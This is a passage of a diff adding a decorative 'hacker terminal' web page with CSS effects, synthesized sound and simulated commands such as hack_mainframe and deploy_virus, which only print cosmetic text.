@@ -1,0 +1,2019 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEXUS Terminal v3.7.1</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --neon-green: #00ff41;
+            --dark-green: #003b00;
+            --bg-dark: #0a0a0a;
+            --red: #ff0040;
+            --cyan: #00ffff;
+            --purple: #bf00ff;
+        }
+
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            background: var(--bg-dark);
+            min-height: 100vh;
+            overflow: hidden;
+            position: relative;
+            transition: all 0.5s ease;
+        }
+
+        body.darkweb-mode {
+            --neon-green: #bf00ff;
+            --dark-green: #3d0052;
+            --cyan: #ff0066;
+        }
+
+        body.darkweb-mode .matrix-column {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+        }
+
+        /* Flash Glitch Overlay */
+        .flash-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            opacity: 0;
+            pointer-events: none;
+            z-index: 3000;
+            transition: opacity 0.05s;
+        }
+
+        .flash-overlay.active {
+            opacity: 0.8;
+        }
+
+        /* Scanline Effect */
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 0, 0, 0.15),
+                rgba(0, 0, 0, 0.15) 1px,
+                transparent 1px,
+                transparent 2px
+            );
+            z-index: 1000;
+        }
+
+        .crt-flicker {
+            animation: flicker 0.15s infinite;
+        }
+
+        @keyframes flicker {
+            0% { opacity: 0.97; }
+            50% { opacity: 1; }
+            100% { opacity: 0.98; }
+        }
+
+        /* Matrix Rain Background */
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.05;
+            z-index: -1;
+            overflow: hidden;
+        }
+
+        .matrix-column {
+            position: absolute;
+            top: -100%;
+            font-size: 14px;
+            color: var(--neon-green);
+            animation: matrix-fall linear infinite;
+            text-shadow: 0 0 10px var(--neon-green);
+        }
+
+        @keyframes matrix-fall {
+            to { top: 100%; }
+        }
+
+        /* Terminal Container */
+        .terminal-container {
+            max-width: 1000px;
+            margin: 20px auto;
+            padding: 20px;
+            height: calc(100vh - 40px);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .terminal-header {
+            background: linear-gradient(180deg, #1a1a1a 0%, #0d0d0d 100%);
+            border: 1px solid var(--neon-green);
+            border-bottom: none;
+            border-radius: 10px 10px 0 0;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3), inset 0 0 20px rgba(0, 255, 65, 0.05);
+        }
+
+        .terminal-buttons {
+            display: flex;
+            gap: 8px;
+        }
+
+        .terminal-btn {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .terminal-btn:hover {
+            transform: scale(1.3);
+            filter: brightness(1.5);
+        }
+
+        .btn-red { background: #ff5f56; box-shadow: 0 0 10px #ff5f56; }
+        .btn-yellow { background: #ffbd2e; box-shadow: 0 0 10px #ffbd2e; }
+        .btn-green { background: #27ca3f; box-shadow: 0 0 10px #27ca3f; }
+
+        .btn-red:hover { box-shadow: 0 0 20px #ff5f56, 0 0 40px #ff5f56; }
+        .btn-yellow:hover { box-shadow: 0 0 20px #ffbd2e, 0 0 40px #ffbd2e; }
+        .btn-green:hover { box-shadow: 0 0 20px #27ca3f, 0 0 40px #27ca3f; }
+
+        .terminal-title {
+            color: var(--neon-green);
+            font-size: 14px;
+            text-shadow: 0 0 10px var(--neon-green);
+            letter-spacing: 2px;
+        }
+
+        .terminal-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--neon-green);
+            border-radius: 50%;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; box-shadow: 0 0 10px var(--neon-green); }
+            50% { opacity: 0.5; box-shadow: 0 0 5px var(--neon-green); }
+        }
+
+        .terminal-body {
+            flex: 1;
+            background: rgba(0, 10, 0, 0.95);
+            border: 1px solid var(--neon-green);
+            border-top: none;
+            border-radius: 0 0 10px 10px;
+            padding: 20px;
+            overflow-y: auto;
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.2), inset 0 0 50px rgba(0, 255, 65, 0.03);
+            position: relative;
+        }
+
+        .terminal-body::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .terminal-body::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+
+        .terminal-body::-webkit-scrollbar-thumb {
+            background: var(--dark-green);
+            border-radius: 4px;
+        }
+
+        .terminal-body::-webkit-scrollbar-thumb:hover {
+            background: var(--neon-green);
+        }
+
+        #output {
+            color: var(--neon-green);
+            font-size: 14px;
+            line-height: 1.6;
+            text-shadow: 0 0 5px var(--neon-green);
+        }
+
+        .output-line {
+            margin-bottom: 5px;
+            animation: fadeIn 0.1s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .input-line {
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+        }
+
+        .prompt {
+            color: var(--cyan);
+            margin-right: 10px;
+            text-shadow: 0 0 10px var(--cyan);
+        }
+
+        #command-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: var(--neon-green);
+            font-family: inherit;
+            font-size: 14px;
+            outline: none;
+            text-shadow: 0 0 5px var(--neon-green);
+            caret-color: var(--neon-green);
+        }
+
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 18px;
+            background: var(--neon-green);
+            animation: blink 0.7s infinite;
+            vertical-align: middle;
+            box-shadow: 0 0 10px var(--neon-green);
+        }
+
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+
+        /* Command Menu */
+        .command-menu {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            z-index: 100;
+        }
+
+        .menu-toggle {
+            background: rgba(0, 255, 65, 0.1);
+            border: 1px solid var(--neon-green);
+            color: var(--neon-green);
+            padding: 8px 15px;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 12px;
+            border-radius: 5px;
+            transition: all 0.3s;
+            text-shadow: 0 0 5px var(--neon-green);
+        }
+
+        .menu-toggle:hover {
+            background: rgba(0, 255, 65, 0.3);
+            box-shadow: 0 0 20px var(--neon-green);
+            transform: scale(1.05);
+        }
+
+        .menu-dropdown {
+            display: none;
+            position: absolute;
+            top: 100%;
+            right: 0;
+            background: rgba(0, 10, 0, 0.98);
+            border: 1px solid var(--neon-green);
+            border-radius: 5px;
+            margin-top: 5px;
+            min-width: 200px;
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
+        }
+
+        .menu-dropdown.active {
+            display: block;
+            animation: menuSlide 0.3s ease;
+        }
+
+        @keyframes menuSlide {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .menu-item {
+            padding: 10px 15px;
+            cursor: pointer;
+            transition: all 0.2s;
+            border-bottom: 1px solid rgba(0, 255, 65, 0.2);
+            color: var(--neon-green);
+        }
+
+        .menu-item:last-child {
+            border-bottom: none;
+        }
+
+        .menu-item:hover {
+            background: rgba(0, 255, 65, 0.2);
+            padding-left: 20px;
+            text-shadow: 0 0 10px var(--neon-green);
+        }
+
+        .menu-item span {
+            color: var(--cyan);
+            margin-right: 10px;
+        }
+
+        /* Special Text Styles */
+        .text-red {
+            color: var(--red) !important;
+            text-shadow: 0 0 10px var(--red) !important;
+        }
+
+        .text-cyan {
+            color: var(--cyan) !important;
+            text-shadow: 0 0 10px var(--cyan) !important;
+        }
+
+        .text-yellow {
+            color: #ffff00 !important;
+            text-shadow: 0 0 10px #ffff00 !important;
+        }
+
+        .text-white {
+            color: #ffffff !important;
+            text-shadow: 0 0 5px #ffffff !important;
+        }
+
+        .text-purple {
+            color: var(--purple) !important;
+            text-shadow: 0 0 10px var(--purple) !important;
+        }
+
+        /* Access Granted Animation */
+        .access-granted {
+            color: var(--neon-green);
+            font-size: 18px;
+            font-weight: bold;
+            text-shadow: 0 0 20px var(--neon-green), 0 0 40px var(--neon-green);
+            animation: glow-pulse 0.5s ease-in-out 3;
+        }
+
+        .access-granted-box {
+            border: 3px solid var(--neon-green);
+            padding: 20px;
+            margin: 15px 0;
+            text-align: center;
+            animation: accessGrantedAnim 0.5s ease-out, borderGlow 1s ease-in-out infinite;
+            background: rgba(0, 255, 65, 0.1);
+        }
+
+        @keyframes accessGrantedAnim {
+            0% { transform: scale(0.5); opacity: 0; }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        @keyframes borderGlow {
+            0%, 100% { box-shadow: 0 0 20px var(--neon-green), inset 0 0 20px rgba(0, 255, 65, 0.1); }
+            50% { box-shadow: 0 0 40px var(--neon-green), inset 0 0 30px rgba(0, 255, 65, 0.2); }
+        }
+
+        .access-denied {
+            color: var(--red);
+            font-size: 18px;
+            font-weight: bold;
+            text-shadow: 0 0 20px var(--red), 0 0 40px var(--red);
+            animation: shake 0.5s ease-in-out;
+        }
+
+        .access-denied-box {
+            border: 3px solid var(--red);
+            padding: 20px;
+            margin: 15px 0;
+            text-align: center;
+            animation: accessDeniedAnim 0.5s ease-out, borderGlowRed 1s ease-in-out infinite;
+            background: rgba(255, 0, 64, 0.1);
+        }
+
+        @keyframes accessDeniedAnim {
+            0%, 20%, 40%, 60%, 80%, 100% { transform: translateX(0); }
+            10%, 50%, 90% { transform: translateX(-10px); }
+            30%, 70% { transform: translateX(10px); }
+        }
+
+        @keyframes borderGlowRed {
+            0%, 100% { box-shadow: 0 0 20px var(--red), inset 0 0 20px rgba(255, 0, 64, 0.1); }
+            50% { box-shadow: 0 0 40px var(--red), inset 0 0 30px rgba(255, 0, 64, 0.2); }
+        }
+
+        @keyframes glow-pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            background: #1a1a1a;
+            border: 1px solid var(--neon-green);
+            border-radius: 3px;
+            height: 20px;
+            margin: 10px 0;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--dark-green), var(--neon-green));
+            box-shadow: 0 0 20px var(--neon-green);
+            transition: width 0.1s linear;
+        }
+
+        .progress-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 12px;
+            text-shadow: 0 0 5px black;
+        }
+
+        /* Glitch Effect */
+        .glitch {
+            animation: glitch-anim 0.3s linear infinite;
+        }
+
+        @keyframes glitch-anim {
+            0% { text-shadow: 2px 0 var(--red), -2px 0 var(--cyan); }
+            25% { text-shadow: -2px 0 var(--red), 2px 0 var(--cyan); }
+            50% { text-shadow: 2px 0 var(--cyan), -2px 0 var(--red); }
+            75% { text-shadow: -2px 0 var(--cyan), 2px 0 var(--red); }
+            100% { text-shadow: 2px 0 var(--red), -2px 0 var(--cyan); }
+        }
+
+        /* ASCII Art */
+        .ascii-art {
+            font-size: 10px;
+            line-height: 1.2;
+            color: var(--neon-green);
+            white-space: pre;
+        }
+
+        /* Boot Screen */
+        .boot-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--bg-dark);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            flex-direction: column;
+        }
+
+        .boot-text {
+            color: var(--neon-green);
+            font-size: 16px;
+            text-shadow: 0 0 10px var(--neon-green);
+            text-align: center;
+            max-width: 600px;
+            padding: 20px;
+        }
+
+        /* File Tree Styles */
+        .file-tree {
+            margin-left: 20px;
+        }
+
+        .file-tree-item {
+            padding: 2px 0;
+        }
+
+        .folder {
+            color: var(--cyan) !important;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .folder:hover {
+            color: var(--neon-green) !important;
+            text-shadow: 0 0 10px var(--neon-green);
+            padding-left: 5px;
+        }
+
+        .file {
+            color: var(--neon-green) !important;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .file:hover {
+            color: var(--cyan) !important;
+            text-shadow: 0 0 10px var(--cyan);
+            padding-left: 5px;
+        }
+
+        .file-size {
+            color: #666;
+            margin-left: 15px;
+        }
+
+        .file-content-box {
+            background: rgba(0, 0, 0, 0.8);
+            border: 2px solid var(--cyan);
+            border-radius: 5px;
+            padding: 15px;
+            margin: 10px 0;
+            animation: fileOpen 0.3s ease-out;
+        }
+
+        @keyframes fileOpen {
+            from { opacity: 0; transform: scaleY(0); }
+            to { opacity: 1; transform: scaleY(1); }
+        }
+
+        .file-header {
+            color: var(--cyan);
+            font-weight: bold;
+            margin-bottom: 10px;
+            padding-bottom: 5px;
+            border-bottom: 1px solid var(--cyan);
+        }
+
+        .file-content {
+            color: var(--neon-green);
+            white-space: pre-wrap;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        /* System Message */
+        .system-message {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 10, 0, 0.95);
+            border: 1px solid var(--neon-green);
+            padding: 15px 20px;
+            border-radius: 5px;
+            color: var(--neon-green);
+            font-size: 12px;
+            z-index: 1500;
+            animation: slideIn 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
+            max-width: 300px;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        @keyframes fadeOut {
+            to { opacity: 0; transform: translateX(100%); }
+        }
+
+        .system-message .msg-header {
+            color: var(--cyan);
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        /* Sound Toggle */
+        .sound-toggle {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 255, 65, 0.1);
+            border: 1px solid var(--neon-green);
+            color: var(--neon-green);
+            padding: 10px;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 16px;
+            border-radius: 50%;
+            width: 45px;
+            height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+            z-index: 1500;
+        }
+
+        .sound-toggle:hover {
+            background: rgba(0, 255, 65, 0.3);
+            box-shadow: 0 0 20px var(--neon-green);
+            transform: scale(1.1);
+        }
+
+        .sound-toggle.muted {
+            opacity: 0.5;
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .terminal-container {
+                margin: 10px;
+                padding: 10px;
+                height: calc(100vh - 20px);
+            }
+
+            .terminal-title {
+                font-size: 11px;
+            }
+
+            #output, #command-input {
+                font-size: 12px;
+            }
+
+            .ascii-art {
+                font-size: 5px;
+            }
+
+            .terminal-header {
+                padding: 8px 12px;
+            }
+
+            .terminal-body {
+                padding: 15px;
+            }
+
+            .command-menu {
+                top: 5px;
+                right: 5px;
+            }
+
+            .menu-toggle {
+                padding: 5px 10px;
+                font-size: 10px;
+            }
+
+            .sound-toggle {
+                top: 10px;
+                right: 10px;
+                width: 35px;
+                height: 35px;
+                font-size: 14px;
+            }
+
+            .system-message {
+                bottom: 10px;
+                right: 10px;
+                left: 10px;
+                max-width: none;
+            }
+        }
+    </style>
+</head>
+<body class="crt-flicker">
+    <div class="flash-overlay" id="flash-overlay"></div>
+    <div class="scanlines"></div>
+    <div class="matrix-bg" id="matrix-bg"></div>
+
+    <button class="sound-toggle" id="sound-toggle" title="Toggle Sound">🔊</button>
+
+    <div class="boot-screen" id="boot-screen">
+        <div class="boot-text" id="boot-text"></div>
+    </div>
+
+    <div class="terminal-container" id="terminal" style="display: none;">
+        <div class="terminal-header">
+            <div class="terminal-buttons">
+                <div class="terminal-btn btn-red" title="Close"></div>
+                <div class="terminal-btn btn-yellow" title="Minimize"></div>
+                <div class="terminal-btn btn-green" title="Maximize"></div>
+            </div>
+            <div class="terminal-title">NEXUS TERMINAL v3.7.1 — SECURE CONNECTION</div>
+            <div class="terminal-status">
+                <div class="status-dot"></div>
+                <span style="color: var(--neon-green); font-size: 12px;">ONLINE</span>
+            </div>
+        </div>
+        <div class="terminal-body" id="terminal-body">
+            <div class="command-menu">
+                <button class="menu-toggle" id="menu-toggle">💬 COMMANDS</button>
+                <div class="menu-dropdown" id="menu-dropdown">
+                    <div class="menu-item" data-cmd="help"><span>❓</span> help</div>
+                    <div class="menu-item" data-cmd="scan_network"><span>📡</span> scan_network</div>
+                    <div class="menu-item" data-cmd="decrypt_sequence"><span>🔓</span> decrypt_sequence</div>
+                    <div class="menu-item" data-cmd="override_security"><span>🔐</span> override_security</div>
+                    <div class="menu-item" data-cmd="trace_route"><span>🌐</span> trace_route</div>
+                    <div class="menu-item" data-cmd="access_logs"><span>📋</span> access_logs</div>
+                    <div class="menu-item" data-cmd="hack_mainframe"><span>💀</span> hack_mainframe</div>
+                    <div class="menu-item" data-cmd="deploy_virus"><span>🦠</span> deploy_virus</div>
+                    <div class="menu-item" data-cmd="files"><span>📁</span> files</div>
+                    <div class="menu-item" data-cmd="skull"><span>💀</span> skull</div>
+                    <div class="menu-item" data-cmd="darkweb"><span>🌑</span> darkweb</div>
+                    <div class="menu-item" data-cmd="clear"><span>🗑️</span> clear</div>
+                </div>
+            </div>
+            <div id="output"></div>
+            <div class="input-line" id="input-line">
+                <span class="prompt">root@nexus:~$</span>
+                <input type="text" id="command-input" autofocus autocomplete="off" spellcheck="false">
+                <span class="cursor"></span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Realistic Audio Context for Sound Effects
+        let audioContext;
+        let soundEnabled = true;
+
+        function initAudio() {
+            audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        }
+
+        function playSound(type) {
+            if (!soundEnabled || !audioContext) return;
+            
+            const now = audioContext.currentTime;
+            
+            switch(type) {
+                case 'keypress':
+                    // Realistic mechanical keyboard click
+                    const keyOsc = audioContext.createOscillator();
+                    const keyGain = audioContext.createGain();
+                    const keyNoise = audioContext.createBufferSource();
+                    
+                    // Create white noise for click
+                    const buffer = audioContext.createBuffer(1, audioContext.sampleRate * 0.02, audioContext.sampleRate);
+                    const data = buffer.getChannelData(0);
+                    for (let i = 0; i < data.length; i++) {
+                        data[i] = Math.random() * 2 - 1;
+                    }
+                    keyNoise.buffer = buffer;
+                    
+                    const noiseFilter = audioContext.createBiquadFilter();
+                    noiseFilter.type = 'bandpass';
+                    noiseFilter.frequency.value = 3000 + Math.random() * 2000;
+                    
+                    keyNoise.connect(noiseFilter);
+                    noiseFilter.connect(keyGain);
+                    keyGain.connect(audioContext.destination);
+                    keyGain.gain.value = 0.03;
+                    keyGain.gain.exponentialRampToValueAtTime(0.001, now + 0.02);
+                    
+                    keyNoise.start(now);
+                    keyNoise.stop(now + 0.02);
+                    break;
+                    
+                case 'enter':
+                    // Enter key sound
+                    const enterNoise = audioContext.createBufferSource();
+                    const enterGain = audioContext.createGain();
+                    const enterBuffer = audioContext.createBuffer(1, audioContext.sampleRate * 0.05, audioContext.sampleRate);
+                    const enterData = enterBuffer.getChannelData(0);
+                    for (let i = 0; i < enterData.length; i++) {
+                        enterData[i] = Math.random() * 2 - 1;
+                    }
+                    enterNoise.buffer = enterBuffer;
+                    
+                    const enterFilter = audioContext.createBiquadFilter();
+                    enterFilter.type = 'lowpass';
+                    enterFilter.frequency.value = 1500;
+                    
+                    enterNoise.connect(enterFilter);
+                    enterFilter.connect(enterGain);
+                    enterGain.connect(audioContext.destination);
+                    enterGain.gain.value = 0.08;
+                    enterGain.gain.exponentialRampToValueAtTime(0.001, now + 0.05);
+                    
+                    enterNoise.start(now);
+                    enterNoise.stop(now + 0.05);
+                    break;
+                    
+                case 'success':
+                    // Success notification sound
+                    const successOsc = audioContext.createOscillator();
+                    const successGain = audioContext.createGain();
+                    successOsc.connect(successGain);
+                    successGain.connect(audioContext.destination);
+                    
+                    successOsc.frequency.value = 800;
+                    successOsc.type = 'sine';
+                    successGain.gain.value = 0.1;
+                    successOsc.start(now);
+                    successOsc.frequency.exponentialRampToValueAtTime(1200, now + 0.15);
+                    successGain.gain.exponentialRampToValueAtTime(0.001, now + 0.15);
+                    successOsc.stop(now + 0.15);
+                    break;
+                    
+                case 'error':
+                    // Error buzz
+                    const errorOsc = audioContext.createOscillator();
+                    const errorGain = audioContext.createGain();
+                    errorOsc.connect(errorGain);
+                    errorGain.connect(audioContext.destination);
+                    
+                    errorOsc.frequency.value = 200;
+                    errorOsc.type = 'sawtooth';
+                    errorGain.gain.value = 0.12;
+                    errorOsc.start(now);
+                    errorGain.gain.exponentialRampToValueAtTime(0.001, now + 0.2);
+                    errorOsc.stop(now + 0.2);
+                    break;
+                    
+                case 'glitch':
+                    // Digital glitch/interference
+                    const glitchNoise = audioContext.createBufferSource();
+                    const glitchGain = audioContext.createGain();
+                    const glitchBuffer = audioContext.createBuffer(1, audioContext.sampleRate * 0.08, audioContext.sampleRate);
+                    const glitchData = glitchBuffer.getChannelData(0);
+                    for (let i = 0; i < glitchData.length; i++) {
+                        glitchData[i] = (Math.random() * 2 - 1) * Math.sin(i / 10);
+                    }
+                    glitchNoise.buffer = glitchBuffer;
+                    
+                    const distortion = audioContext.createWaveShaper();
+                    distortion.curve = makeDistortionCurve(400);
+                    
+                    glitchNoise.connect(distortion);
+                    distortion.connect(glitchGain);
+                    glitchGain.connect(audioContext.destination);
+                    glitchGain.gain.value = 0.06;
+                    
+                    glitchNoise.start(now);
+                    glitchNoise.stop(now + 0.08);
+                    break;
+                    
+                case 'boot':
+                    // System boot beep
+                    const bootOsc = audioContext.createOscillator();
+                    const bootGain = audioContext.createGain();
+                    bootOsc.connect(bootGain);
+                    bootGain.connect(audioContext.destination);
+                    
+                    bootOsc.frequency.value = 600;
+                    bootOsc.type = 'sine';
+                    bootGain.gain.value = 0.08;
+                    bootOsc.start(now);
+                    bootGain.gain.exponentialRampToValueAtTime(0.001, now + 0.1);
+                    bootOsc.stop(now + 0.1);
+                    break;
+                    
+                case 'scan':
+                    // Scanning beep
+                    const scanOsc = audioContext.createOscillator();
+                    const scanGain = audioContext.createGain();
+                    scanOsc.connect(scanGain);
+                    scanGain.connect(audioContext.destination);
+                    
+                    scanOsc.frequency.value = 1200;
+                    scanOsc.type = 'sine';
+                    scanGain.gain.value = 0.05;
+                    scanOsc.start(now);
+                    scanGain.gain.exponentialRampToValueAtTime(0.001, now + 0.05);
+                    scanOsc.stop(now + 0.05);
+                    break;
+            }
+        }
+        
+        function makeDistortionCurve(amount) {
+            const samples = 44100;
+            const curve = new Float32Array(samples);
+            const deg = Math.PI / 180;
+            for (let i = 0; i < samples; i++) {
+                const x = (i * 2) / samples - 1;
+                curve[i] = ((3 + amount) * x * 20 * deg) / (Math.PI + amount * Math.abs(x));
+            }
+            return curve;
+        }
+
+        // Sound Toggle
+        document.getElementById('sound-toggle').addEventListener('click', () => {
+            if (!audioContext) initAudio();
+            soundEnabled = !soundEnabled;
+            const btn = document.getElementById('sound-toggle');
+            btn.textContent = soundEnabled ? '🔊' : '🔇';
+            btn.classList.toggle('muted', !soundEnabled);
+        });
+
+        // Flash Glitch Effect
+        function flashGlitch() {
+            const flash = document.getElementById('flash-overlay');
+            flash.classList.add('active');
+            playSound('glitch');
+            setTimeout(() => {
+                flash.classList.remove('active');
+            }, 50);
+        }
+
+        // Matrix Background
+        function createMatrixRain() {
+            const matrixBg = document.getElementById('matrix-bg');
+            const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789';
+            
+            for (let i = 0; i < 50; i++) {
+                const column = document.createElement('div');
+                column.className = 'matrix-column';
+                column.style.left = Math.random() * 100 + '%';
+                column.style.animationDuration = (Math.random() * 10 + 5) + 's';
+                column.style.animationDelay = Math.random() * 5 + 's';
+                
+                let text = '';
+                for (let j = 0; j < 30; j++) {
+                    text += chars[Math.floor(Math.random() * chars.length)] + '<br>';
+                }
+                column.innerHTML = text;
+                matrixBg.appendChild(column);
+            }
+        }
+
+        // Command History
+        let commandHistory = [];
+        let historyIndex = -1;
+
+        // Boot Sequence
+        const bootMessages = [
+            { text: '> INITIALIZING NEXUS TERMINAL v3.7.1...', delay: 100 },
+            { text: '> LOADING KERNEL MODULES...', delay: 800 },
+            { text: '> [OK] Core systems initialized', delay: 400 },
+            { text: '> [OK] Network interface detected', delay: 300 },
+            { text: '> [OK] Encryption protocols loaded', delay: 350 },
+            { text: '> [OK] Firewall bypass modules ready', delay: 400 },
+            { text: '> ESTABLISHING SECURE CONNECTION...', delay: 600 },
+            { text: '> ROUTING THROUGH PROXY CHAIN...', delay: 500 },
+            { text: '> [■■■■■■■■■■] 100% COMPLETE', delay: 400 },
+            { text: '> CONNECTION ESTABLISHED', delay: 300 },
+            { text: '', delay: 200 },
+            { text: '> WELCOME, OPERATOR', delay: 500 },
+            { text: '> TYPE "help" FOR AVAILABLE COMMANDS', delay: 300 },
+        ];
+
+        async function typeText(element, text, speed = 30) {
+            for (let char of text) {
+                element.innerHTML += char;
+                playSound('boot');
+                await sleep(speed);
+            }
+            element.innerHTML += '\n';
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        async function bootSequence() {
+            const bootText = document.getElementById('boot-text');
+            
+            for (let msg of bootMessages) {
+                await typeText(bootText, msg.text, 20);
+                await sleep(msg.delay);
+            }
+
+            await sleep(1000);
+            document.getElementById('boot-screen').style.display = 'none';
+            document.getElementById('terminal').style.display = 'flex';
+            showWelcome();
+            startAutoMessages();
+        }
+
+        // Terminal Logic
+        const output = document.getElementById('output');
+        const commandInput = document.getElementById('command-input');
+        const terminalBody = document.getElementById('terminal-body');
+
+        const asciiLogo = `
+ ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
+ ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
+ ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
+ ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
+ ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
+ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
+        `;
+
+        const asciiSkull = `
+                    ██████████                    
+                ████░░░░░░░░░░████                
+              ██░░░░░░░░░░░░░░░░░░██              
+            ██░░░░░░░░░░░░░░░░░░░░░░██            
+          ██░░░░░░░░░░░░░░░░░░░░░░░░░░██          
+          ██░░░░░░░░░░░░░░░░░░░░░░░░░░██          
+        ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██        
+        ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██        
+        ██░░░░████░░░░░░░░░░░░████░░░░░░██        
+        ██░░░░████░░░░░░░░░░░░████░░░░░░██        
+        ██░░░░░░░░░░░░██░░░░░░░░░░░░░░░░██        
+        ██░░░░░░░░░░░░██░░░░░░░░░░░░░░░░██        
+          ██░░░░░░░░░░░░░░░░░░░░░░░░░░██          
+          ██░░██░░░░░░░░░░░░░░░░░░██░░██          
+            ██░░████████████████░░██              
+              ██░░░░░░░░░░░░░░░░██                
+              ██░░██░░██░░██░░██░░                
+                ██████████████                    
+        `;
+
+        function showWelcome() {
+            addOutput(`<pre class="ascii-art">${asciiLogo}</pre>`);
+            addOutput('<span class="text-cyan">═══════════════════════════════════════════════════</span>');
+            addOutput('<span class="text-yellow">  NEXUS TERMINAL v3.7.1 — CLASSIFIED ACCESS ONLY</span>');
+            addOutput('<span class="text-cyan">═══════════════════════════════════════════════════</span>');
+            addOutput('');
+            addOutput('Type <span class="text-yellow">help</span> to see available commands.');
+            addOutput('Use <span class="text-cyan">↑/↓</span> arrows to navigate command history.');
+            addOutput('');
+        }
+
+        function addOutput(html, className = '') {
+            const line = document.createElement('div');
+            line.className = 'output-line ' + className;
+            line.innerHTML = html;
+            output.appendChild(line);
+            scrollToBottom();
+        }
+
+        function scrollToBottom() {
+            terminalBody.scrollTop = terminalBody.scrollHeight;
+        }
+
+        async function typeOutput(text, speed = 20, className = '') {
+            const line = document.createElement('div');
+            line.className = 'output-line ' + className;
+            output.appendChild(line);
+            
+            for (let char of text) {
+                line.innerHTML += char;
+                scrollToBottom();
+                await sleep(speed);
+            }
+        }
+
+        async function showProgress(label, duration = 3000) {
+            const container = document.createElement('div');
+            container.innerHTML = `
+                <div>${label}</div>
+                <div class="progress-container">
+                    <div class="progress-bar" style="width: 0%"></div>
+                    <div class="progress-text">0%</div>
+                </div>
+            `;
+            output.appendChild(container);
+            scrollToBottom();
+
+            const bar = container.querySelector('.progress-bar');
+            const text = container.querySelector('.progress-text');
+            
+            for (let i = 0; i <= 100; i += 2) {
+                bar.style.width = i + '%';
+                text.textContent = i + '%';
+                await sleep(duration / 50);
+            }
+        }
+
+        function generateRandomIP() {
+            return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+        }
+
+        function generateRandomHex(length) {
+            let result = '';
+            const chars = '0123456789ABCDEF';
